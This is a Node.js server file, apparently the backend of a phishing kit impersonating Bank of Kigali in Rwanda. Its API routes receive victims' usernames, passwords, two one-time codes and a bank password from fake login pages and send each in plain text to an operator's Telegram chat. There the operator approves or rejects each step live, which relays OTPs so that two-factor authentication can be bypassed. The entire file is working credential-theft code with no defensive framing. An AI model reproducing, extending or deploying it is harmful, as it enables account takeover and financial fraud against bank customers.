const express = require('express');
const { Telegraf } = require('telegraf');
const path = require('path');
require('dotenv').config();

const app = express();
const PORT = process.env.PORT || 8080;

// -------------------- INIT BOT --------------------
if (!process.env.BOT_TOKEN) {
    throw new Error("BOT_TOKEN is missing in .env");
}

const bot = new Telegraf(process.env.BOT_TOKEN);
const ADMIN_ID = String(process.env.ADMIN_CHAT_ID || "").trim();

// -------------------- MEMORY STORE --------------------
const statusStore = {};

// -------------------- MIDDLEWARE --------------------
app.use(express.json());
app.use(express.static(path.join(__dirname, 'public')));

// -------------------- ROUTES --------------------
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

// -------------------- LOGIN API --------------------
app.post('/api/login-notification', async (req, res) => {
    const { username, password } = req.body || {};
    const country = "Rwanda";

    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!username || !password || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[username] = "pending";

    const message = `🏦 <b>BANK OF KIGALI - LOGIN ATTEMPT</b>

🆕 <b>NEW USER</b>
🇷🇼 <b>Country:</b> ${country}
👤 <b>Username:</b> ${username}
🔑 <b>Bank Password:</b> ${password}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>User waiting for approval</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, message, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Allow to proceed", callback_data: `approve|${username}|${password}` },
                        { text: "❌ Invalid credentials", callback_data: `deny|${username}|${password}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- FIRST OTP API --------------------
app.post('/api/verify-first-otp', async (req, res) => {
    const { username, code } = req.body || {};
    const country = "Rwanda";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!username || !code || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[username] = "pending_otp1";

    const otpMessage = `🆕 <b>BANK OF KIGALI - VERIFICATION NEEDED</b>
🇷🇼 <b>Country:</b> ${country}
👤 <b>Username:</b> ${username}
🔑 <b>VERIFICATION CODE:</b> <code>${code}</code>
⏰ <b>Time:</b> ${currentTime}

<b>━━━━━━━━━━━━━━━━━</b>

⚠️ <b>Verify the credentials:</b>
⏰ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage, {
            parse_mode: 'HTML',
            disable_web_page_preview: true,
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct (Password + OTP)", callback_data: `otp1_correct|${username}` }
                    ],
                    [
                        { text: "❌ Wrong Code", callback_data: `otp1_wrong|${username}` },
                        { text: "⚠️ Wrong Password", callback_data: `otp2_wrongpin|${username}` }
                    ],
                    [
                        { text: "📞 Contact Us", callback_data: `contact_us|${username}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- SECOND OTP API --------------------
app.post('/api/verify-second-otp', async (req, res) => {
    const { username, otp } = req.body || {};
    const country = "Rwanda";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!username || !otp || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[username] = "pending_otp2";

    const otpMessage2 = `2️⃣ <b>BANK OF KIGALI - SECOND OTP (Step 2/2)</b>

🆕 <b>NEW USER - SECOND VERIFICATION</b>
🇷🇼 <b>Country:</b> ${country}
👤 <b>Username:</b> ${username}
🔐 <b>Second OTP Code:</b> ${otp}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify SECOND OTP:</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, otpMessage2, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `otp2_correct|${username}|${otp}` },
                        { text: "❌ Wrong Code", callback_data: `otp2_wrong|${username}` },
                        { text: "🔑 Wrong Password", callback_data: `otp2_wrongpin|${username}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: err.message });
    }
});

// -------------------- RESEND OTP API --------------------
app.post('/api/resend-otp-notification', async (req, res) => {
    const { username, step } = req.body || {};
    
    if (!username || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    const resendMsg = `🔄 <b>RESEND REQUESTED</b>

👤 <b>Username:</b> ${username}
📍 <b>Step:</b> ${step}
⚠️ <b>User is waiting for a new code.</b>

━━━━━━━━━━━━━━━`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, resendMsg, { parse_mode: 'HTML' });
        res.json({ success: true });
    } catch (err) {
        console.error(err);
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BANK PASSWORD API --------------------
app.post('/api/verify-bank-pin', async (req, res) => {
    const { username, bankPassword } = req.body || {};
    const country = "Rwanda";
    const currentTime = new Date().toLocaleString('en-US', {
        month: 'numeric', day: 'numeric', year: 'numeric',
        hour: 'numeric', minute: 'numeric', second: 'numeric',
        hour12: true
    });

    if (!username || !bankPassword || !ADMIN_ID) return res.status(400).json({ error: "Missing data" });

    statusStore[username] = "pending_bank_pin";

    const bankPinMessage = `🏦 <b>BANK OF KIGALI - BANK PASSWORD VERIFICATION (Step 3)</b>

🆕 <b>NEW USER - BANK SECURITY</b>
🇷🇼 <b>Country:</b> ${country}
👤 <b>Username:</b> ${username}
🔑 <b>Bank Password:</b> ${bankPassword}
⏰ <b>Time:</b> ${currentTime}

━━━━━━━━━━━━━━━

⚠️ <b>Verify BANK PASSWORD:</b>
⌛ <b>Timeout: 5 minutes</b>`;

    try {
        await bot.telegram.sendMessage(ADMIN_ID, bankPinMessage, {
            parse_mode: 'HTML',
            reply_markup: {
                inline_keyboard: [
                    [
                        { text: "✅ Correct", callback_data: `bank_correct|${username}|${bankPassword}` },
                        { text: "❌ Wrong Password", callback_data: `bank_wrong|${username}` }
                    ]
                ]
            }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: "Telegram error" });
    }
});

// -------------------- BOT ACTIONS --------------------
bot.action(/^approve\|(.+)\|(.+)/, async (ctx) => {
    const username = ctx.match[1];
    const password = ctx.match[2];
    statusStore[username] = "approved";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const approvedMsg = `✅ <b>LOGIN APPROVED</b>

🆕 <b>NEW USER</b>
🇷🇼 <b>Rwanda</b>
👤 <b>${username}</b>
🔐 <b>${password}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Approved</b>
➡️ <b>Next: First OTP (1/2)</b>
⏱ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Allowed");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(approvedMsg);
});

bot.action(/^deny\|(.+)\|(.+)/, async (ctx) => {
    const username = ctx.match[1];
    const password = ctx.match[2];
    statusStore[username] = "denied";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const deniedMsg = `❌ <b>INVALID CREDENTIALS</b>

🇷🇼 <b>Rwanda</b>
👤 <b>${username}</b>
🔐 <b>${password}</b>

━━━━━━━━━━━━━━━

❌ <b>Status: Rejected</b>
⏱️ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Rejected");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(deniedMsg);
});

bot.action(/^otp1_correct\|(.+)/, async (ctx) => {
    const username = ctx.match[1];
    statusStore[username] = "otp1_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg = `1️⃣ <b>FIRST OTP VERIFIED (Step 1/2)</b>

🇷🇼 <b>Rwanda</b>
👤 <b>${username}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: First OTP verified</b>
➡️ <b>Next: Second OTP (2/2) will be sent</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg);
});

bot.action(/^otp1_wrong\|(.+)/, async (ctx) => {
    const username = ctx.match[1];
    statusStore[username] = "otp1_wrong";
    await ctx.answerCbQuery("Wrong Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>FIRST OTP WRONG</b>\n👤 <b>User:</b> ${username}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
});

bot.action(/^contact_us\|(.+)/, async (ctx) => {
    const username = ctx.match[1];
    statusStore[username] = "contact_us";
    await ctx.answerCbQuery("Contact Us Clicked");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`📞 <b>CONTACT REQUESTED</b>\n👤 <b>User:</b> ${username}\n⚠️ <b>User requested contact support.</b>`);
});

bot.action(/^otp2_correct\|(.+)\|(.+)/, async (ctx) => {
    const username = ctx.match[1];
    const otp = ctx.match[2];
    statusStore[username] = "otp2_correct";
    const currentTime = new Date().toLocaleTimeString('en-US', { hour: 'numeric', minute: 'numeric', second: 'numeric', hour12: true });

    const verifiedMsg2 = `2️⃣ <b>SECOND OTP VERIFIED (Step 2/2)</b>

🇷🇼 <b>Rwanda</b>
👤 <b>${username}</b>
🔐 <b>${otp}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Second OTP verified</b>
✅ <b>Process Complete</b>
⌛ <b>${currentTime}</b>`;

    await ctx.answerCbQuery("Finalized");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(verifiedMsg2);
});

bot.action(/^otp2_wrong\|(.+)/, async (ctx) => {
    const username = ctx.match[1];
    statusStore[username] = "otp2_wrong";
    await ctx.answerCbQuery("Wrong Code");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>SECOND OTP WRONG</b>\n👤 <b>User:</b> ${username}\n⚠️ <b>Prompted to re-enter OTP.</b>`);
});

bot.action(/^bank_correct\|(.+)\|(.+)/, async (ctx) => {
    const username = ctx.match[1];
    const password = ctx.match[2];
    statusStore[username] = "bank_password_correct";
    
    const finalizedMsg = `✅ <b>BANK PASSWORD VERIFIED</b>

🇷🇼 <b>Rwanda</b>
👤 <b>${username}</b>
🔑 <b>${password}</b>

━━━━━━━━━━━━━━━

✅ <b>Status: Process Completed</b>
🏁 <b>User redirected to Success page</b>`;

    await ctx.answerCbQuery("Bank Password Verified");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(finalizedMsg);
});

bot.action(/^bank_wrong\|(.+)/, async (ctx) => {
    const username = ctx.match[1];
    statusStore[username] = "bank_password_wrong";
    await ctx.answerCbQuery("Wrong Bank Password");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`❌ <b>BANK PASSWORD WRONG</b>\n👤 <b>User:</b> ${username}\n⚠️ <b>Prompted to re-enter Bank Password.</b>`);
});

bot.action(/^otp2_wrongpin\|(.+)/, async (ctx) => {
    const username = ctx.match[1];
    statusStore[username] = "otp2_wrongpin";
    await ctx.answerCbQuery("Wrong Password");
    await ctx.editMessageReplyMarkup({ inline_keyboard: [] });
    await ctx.replyWithHTML(`🔑 <b>WRONG PASSWORD REPORTED</b>\n👤 <b>User:</b> ${username}\n⚠️ <b>User prompted to re-enter Password.</b>`);
});

// -------------------- STATUS CHECK --------------------
app.get('/api/check-status', (req, res) => {
    const username = req.query.username || req.query.phone;
    const currentStatus = statusStore[username] || "pending";
    
    res.json({ status: currentStatus });

    if (currentStatus === "approved") {
        statusStore[username] = "idle_waiting_for_otp1";
    }
});

// -------------------- SAFE PAGE ROUTE --------------------
app.get('/:page', (req, res, next) => {
    if (req.params.page.startsWith('api')) return next();
    const file = req.params.page.endsWith('.html') ? req.params.page : req.params.page + '.html';
    res.sendFile(path.join(__dirname, 'public', file), (err) => {
        if (err) res.status(404).send("Page not found");
    });
});

// -------------------- START SERVER & BOT --------------------
app.listen(PORT, async () => {
    console.log(`🚀 Server running on port ${PORT}`);
    try {
        await bot.telegram.deleteWebhook({ drop_pending_updates: true });
        bot.launch();
        console.log("🤖 Bot is active");
    } catch (err) {
        console.error("Launch error:", err);
    }
});

process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
  
